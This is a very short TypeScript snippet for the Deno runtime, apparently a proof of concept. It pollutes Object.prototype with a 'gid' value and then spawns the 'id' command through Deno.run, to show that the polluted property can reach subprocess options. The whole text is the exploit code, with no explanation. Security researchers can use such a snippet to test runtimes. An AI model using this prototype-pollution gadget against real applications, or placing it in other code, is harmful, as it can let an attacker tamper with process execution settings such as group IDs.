function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

pollute("gid", 42);
const process = Deno.run({ cmd: ["id"] });
console.log(process);
